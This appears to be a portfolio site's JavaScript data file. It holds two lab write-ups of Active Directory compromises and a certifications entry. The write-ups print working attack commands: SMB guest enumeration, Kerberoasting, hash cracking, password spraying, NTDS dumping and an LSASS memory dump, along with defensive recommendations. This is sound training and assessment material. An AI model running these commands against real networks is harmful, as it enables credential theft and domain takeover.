![Nmap enumeration](assets/writeups/martiniAD/nmap.png)

## SMB Enumeration

I first checked whether SMB permitted null-session access, then tested guest access to enumerate available shares.

\`\`\`bash
nxc smb 10.1.253.173 -u '' -p '' --shares
nxc smb 10.1.253.173 -u guest -p '' --shares
\`\`\`

![SMB null authentication check](assets/writeups/martiniAD/nxc-null.png)

![SMB share enumeration](assets/writeups/martiniAD/smb-share.png)

### Notes Share

The \`Notes\` share was accessible through the guest account. Reviewing its contents exposed a set of credentials that provided the initial foothold.

\`\`\`bash
smbclient //10.1.253.173/notes -U guest
\`\`\`

![Notes share contents](assets/writeups/martiniAD/note-share.png)

![Additional notes screenshot](assets/writeups/martiniAD/note-share2.png)

## Initial Access

The notes contained credentials for the account \`mprice\`. I used them to enumerate domain RIDs and identify additional domain principals.

\`\`\`text
mprice : [REDACTED]
\`\`\`

![Recovered credentials from notes](assets/writeups/martiniAD/creds-note.png)

### Username Enumeration

\`\`\`bash
nxc smb 10.1.253.173 -u m.price -p '[REDACTED]' --rid-brute
\`\`\`

The enumeration identified the following principals:

- \`mprice\`
- \`athena.t0\`
- \`ATHENA_SVC\`
- \`DC01$\`

![RID brute-force user enumeration](assets/writeups/martiniAD/user-enum.png)

## Kerberoasting

I checked for accounts with Service Principal Names (SPNs) and requested the relevant service ticket for offline password auditing.

\`\`\`bash
impacket-GetUserSPNs DRY.MARTINI.BARS/mprice:'[REDACTED]' -request -dc-ip 10.1.253.173
\`\`\`

![Kerberoastable account enumeration](assets/writeups/martiniAD/kerber.png)

### Password Cracking

The captured Kerberos service-ticket hash was tested against the RockYou wordlist using Hashcat. The service account password was recovered during the lab.

\`\`\`bash
hashcat hash.txt /usr/share/wordlists/rockyou.txt
\`\`\`

\`\`\`text
ATHENA_SVC : [REDACTED]
\`\`\`

![Hashcat result](assets/writeups/martiniAD/hashcrack.png)

## BloodHound Analysis

With the \`ATHENA_SVC\` account compromised, I collected and reviewed Active Directory relationship data to understand the available privilege paths.

\`\`\`bash
bloodyad --host "10.1.253.173" -d "DRY.MARTINI.BARS" -u ATHENA_SVC -p '[REDACTED]' get bloodhound
\`\`\`

![BloodHound analysis](assets/writeups/martiniAD/bloodhoundanalysis.png)

## Password Reuse

I tested the recovered service-account password against the enumerated domain users. The password was also valid for \`athena.t0\`, demonstrating password reuse between a service account and a user account.

\`\`\`bash
nxc ldap 10.1.253.173 -u users.txt -p '[REDACTED]' --continue-on-success
\`\`\`

The account \`athena.t0\` was successfully authenticated.

![LDAP password-spray results](assets/writeups/martiniAD/passspray.png)

## Domain Compromise

With the \`athena.t0\` account compromised, I used the account's privileges to obtain domain credential material through a DCSync operation.

\`\`\`bash
nxc smb 10.1.253.173 -u athena.t0 -p '[REDACTED]' --ntds
\`\`\`
![DCSync results](assets/writeups/martiniAD/psexec.png)
![DCSync results](assets/writeups/martiniAD/dcsync.png)
![DCSync results](assets/writeups/martiniAD/cert.png)
## Key Findings

- Guest-accessible SMB shares exposed internal notes containing valid domain credentials.
- A Kerberoastable service account used a password that could be recovered through offline password auditing.
- The recovered service-account password was reused by another domain user.
- The compromised user account had sufficient replication privileges to perform DCSync, resulting in domain credential exposure.

## Security Recommendations

- Disable guest access and anonymous SMB access unless there is a documented business requirement.
- Review share permissions and remove sensitive operational notes and credentials from shared locations.
- Use long, unique, randomly generated passwords for service accounts and rotate any credentials exposed during the assessment.
- Prefer group Managed Service Accounts (gMSAs) where supported and use strong Kerberos encryption settings.
- Prevent password reuse between service accounts and standard user accounts.
- Audit and tightly restrict directory replication permissions, including \`DS-Replication-Get-Changes\` and \`DS-Replication-Get-Changes-All\`.
- Monitor for unusual directory replication activity and review privileged account membership regularly.
`
}


{
  id: "Forensics-hsm",
  title: "Forensics (Hack Smarter Labs)",
  ctf: "Hack Smarter Labs",
  cat: "OSCP-LK",
  diff: "Medium",
  pts: 0,
  date: "2026-11-16",
  summary: "An assumed-breach Active Directory assessment involving targeted Kerberoasting, forensic artefact analysis, credential discovery, lateral movement and privilege escalation across three Windows hosts.",
  body: `
# Forensics — Hack Smarter Labs

**Machine:** Active Directory  
**Platform:** Hack Smarter Labs  
**Difficulty:** Medium  
**Author:** LainKusanagi

## Scope / Objective

This lab is a hosted version of the OSCP-LK set. OSCP-LK consists of machines designed around the PEN-200 labs and exam, intended to improve enumeration, creative thinking and exploitation methodology.

The assessment began with assumed-breach credentials for the domain user \`shannon\`.

\`\`\`text
Domain: LAINOSCP.local
User: shannon
Password: [REDACTED]
\`\`\`

## Initial Enumeration

### Network Discovery

I started by identifying the available hosts and enumerating their exposed services.

Nmap identified three Windows Server 2022 machines:

| Host | Role |
|---|---|
| DC01 | Domain Controller |
| WS01 | Domain Workstation |
| FORENSICS01 | Forensics Server |

The primary services identified included:

- TCP 53 — DNS
- TCP 88 — Kerberos
- TCP 135 — MSRPC
- TCP 139 — NetBIOS
- TCP 389 — LDAP
- TCP 445 — SMB
- TCP 3389 — RDP
- TCP 5985 — WinRM

![Initial Nmap enumeration](assets/writeups/forensics/image1.png)

### SMB Enumeration

With the supplied credentials, I enumerated SMB shares across all three hosts using NetExec.

\`\`\`bash
nxc smb ip.txt -u shannon -p '<REDACTED>' --shares
\`\`\`

The credentials were accepted across the environment. However, the accessible shares were largely limited to standard administrative and IPC shares.

The Domain Controller also exposed the standard NETLOGON and SYSVOL shares with read permissions.

### Username Enumeration

I continued by enumerating domain users through SMB.

\`\`\`bash
nxc smb ip.txt -u shannon -p '<REDACTED>' --users-export users.txt
\`\`\`

The enumeration returned the following accounts:

\`\`\`text
Administrator
Guest
krbtgt
shannon
lion
kanon
erika
\`\`\`

I saved the discovered usernames for subsequent enumeration.

## BloodHound Analysis

Next, I used RustHound to collect Active Directory information and ingest the resulting data into BloodHound.

This provided a clearer picture of the domain structure, user relationships and potential attack paths.

![BloodHound analysis](assets/writeups/forensics/image2.png)

## Initial Access — Targeted Kerberoasting

During further enumeration, I investigated the possibility of Kerberoasting domain accounts.

I used TargetedKerberoast to identify accounts that could be targeted through SPN manipulation.

\`\`\`bash
python3 targetedKerberoast.py -v \\
  -d "LAINOSCP.local" \\
  -u "shannon" \\
  -p '<REDACTED>' \\
  --dc-host DC01.LAINOSCP.local
\`\`\`

The tool successfully added an SPN to the account \`lion\` and retrieved a Kerberos TGS hash.

The SPN was subsequently removed by the tool.

### Hash Cracking

I saved the retrieved hash and attempted to recover the associated password using John the Ripper.

\`\`\`bash
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
\`\`\`

The password was successfully recovered.

I then used NetExec to verify the credentials against the available WinRM services.

\`\`\`bash
nxc winrm ip.txt -u lion -p '<REDACTED>'
\`\`\`

The credentials were valid for WinRM on WS01, providing an initial foothold on the workstation.

![WinRM access as lion](assets/writeups/forensics/image3.png)

## Credential Discovery — Database1.accdb

After obtaining access to WS01, I explored the accessible files and directories.

One particularly interesting discovery was a Microsoft Access database named \`Database1.accdb\`.

![Database1.accdb discovery](assets/writeups/forensics/image4.png)

### Analysing the Database

I initially attempted to inspect the database using accdb.py.

\`\`\`bash
python3 accdb.py info Database1.accdb
\`\`\`

However, the database was password-protected.

I therefore extracted its password hash using office2john.

\`\`\`bash
office2john Database1.accdb > accdbhash.txt
\`\`\`

I then used John the Ripper to recover the database password.

\`\`\`bash
john accdbhash.txt --show
\`\`\`

After recovering the password, I could inspect the database contents.

\`\`\`bash
python3 accdb.py info Database1.accdb -p '<REDACTED>'
\`\`\`

The database contained two tables:

- Users
- f_17D2B2C18B8040A88C583DF95A5BC07F_Data

The tool also identified VBA/macro content within the database, suggesting that additional information could be stored beyond the visible tables.

![Database information](assets/writeups/forensics/image5.png)

### Extracting Credentials

Further inspection of the database revealed additional account credentials.

The recovered information included credentials associated with:

- kanon
- shannon
- gap

I redacted the recovered passwords from this public write-up.

## Lateral Movement — WS01

I proceeded to validate the newly discovered credentials across the environment.

\`\`\`bash
nxc smb ip.txt -u kanon -p '<REDACTED>'
\`\`\`

The credentials were accepted across the three hosts.

More importantly, NetExec identified administrative access on WS01.

This provided a stronger security context on the workstation and allowed me to investigate its locally stored credential material.

![Local administrator access on WS01](assets/writeups/forensics/image6.png)

### LSA Secrets Enumeration

I investigated the locally stored secrets on WS01.

The resulting enumeration exposed cached domain credential material and additional secret information, including an account credential that was not immediately associated with a known user.

I redacted the recovered secrets from the output.

![LSA secrets enumeration](assets/writeups/forensics/image7.png)

### Password Reuse Investigation

I added the discovered domain usernames to my existing user list and investigated whether the recovered credential was reused elsewhere.

The validation identified the account \`erika\` as accepting the recovered credential across all three hosts.

This provided another route into the environment.

## Privilege Escalation — FORENSICS01

I established a WinRM session using the \`erika\` account and inspected the available Windows privileges.

\`\`\`powershell
whoami /priv
\`\`\`

The output showed that the account had the following enabled privileges:

| Privilege | Description |
|---|---|
| SeDebugPrivilege | Debug programs |
| SeChangeNotifyPrivilege | Bypass traverse checking |
| SeIncreaseWorkingSetPrivilege | Increase a process working set |

The presence of SeDebugPrivilege was particularly interesting because it grants significant process-inspection capabilities.

### LSASS Investigation

I investigated the LSASS process and its accessibility within the current security context.

During the successful attempt documented in my original lab notes, ProcDump produced a memory dump that I subsequently analysed with pypykatz.

\`\`\`powershell
.\procdump.exe -accepteula -ma lsass.exe lsass.dmp
\`\`\`

The resulting dump was transferred for offline analysis.

\`\`\`bash
pypykatz lsa minidump lsass.dmp
\`\`\`

The analysis revealed a logon session belonging to the local Administrator account on FORENSICS01.

The extracted credential material was redacted.

![LSASS analysis](assets/writeups/forensics/image8.png)

### Access to FORENSICS01

With the recovered credential material, I established administrative access to FORENSICS01 through WinRM.

This represented another significant step in the assessment, as I had moved from the initial workstation foothold to administrative access on the dedicated forensics server.

![Administrator access to FORENSICS01](assets/writeups/forensics/image9.png)

## Domain-Level Credential Material

While exploring the Administrator's Documents directory on FORENSICS01, I discovered an interesting directory named \`iocs\`.

Its contents included:

\`\`\`text
administrator.kirbi
beacon_x64.exe
mimikatz.exe
notes.txt
\`\`\`

The presence of these files provided additional forensic artefacts worth investigating.

### Kerberos Ticket Analysis

One of the discovered files was \`administrator.kirbi\`, a Kerberos ticket.

I converted the ticket into the ccache format for further examination.

\`\`\`bash
impacket-ticketConverter administrator.kirbi admin.ccache
\`\`\`

The conversion completed successfully.

### Domain Credential Analysis

I continued investigating the domain-level credential material and examined the available account information.

The final enumeration revealed credential material associated with multiple domain accounts, including:

- Administrator
- Guest
- krbtgt
- shannon
- lion
- kanon
- erika
- DC01$
- WS01$
- FORENSICS01$

Sensitive hashes and credential material have been omitted from this write-up.

![Domain credential enumeration](assets/writeups/forensics/image10.png)

## Conclusion

Forensics was an interesting Active Directory assessment that required more than conventional domain enumeration.

The initial foothold came from the supplied credentials, followed by targeted Kerberoasting to obtain access to WS01.

The discovery of the password-protected Access database was particularly important, as it introduced another source of credential material and enabled further movement through the environment.

The most interesting part of the assessment was the transition from workstation access to administrative access on FORENSICS01. Investigating Windows privileges, LSASS and the available forensic artefacts helped demonstrate how locally accessible information can affect the security of an entire domain.

### Key Takeaways

- Targeted Kerberoasting can expose accounts with weak passwords.
- Password-protected database files can contain valuable information.
- Credential reuse can significantly increase the impact of an initial compromise.
- Windows privileges such as SeDebugPrivilege deserve careful investigation.
- LSASS and locally stored secrets can expose sensitive authentication material.
- Forensic artefacts, including Kerberos tickets, can provide important evidence during an assessment.

Overall, this range reinforced the importance of thorough enumeration and investigating seemingly ordinary files rather than relying exclusively on conventional Active Directory attack paths.
`
},


];

/* ---------- CERTIFICATIONS ---------- */
const CERTS = [
  {
    id: "c-pjpt",
    name: "PJPT",
    issuer: "TCM Security",
    date: "2026-11",
    credId: "",
    link: "", // verify link removed to avoid exposing the real name on the public Accredible page
    note: "Active Directory hacking, enumeration, ethical hacking, information gathering, pentesting",
    badgeUrl: "assets/certs/pjpt-badge.png",
    fileUrl: "https://www.credential.net/d20f0124-d39f-4b72-8449-42e386c89f44#acc.6weKFfDk", // e.g. "assets/certs/pjpt.jpg" once you add the certificate image/PDF
    fileType: ""  // e.g. "image/jpeg" or "application/pdf"
  }
];
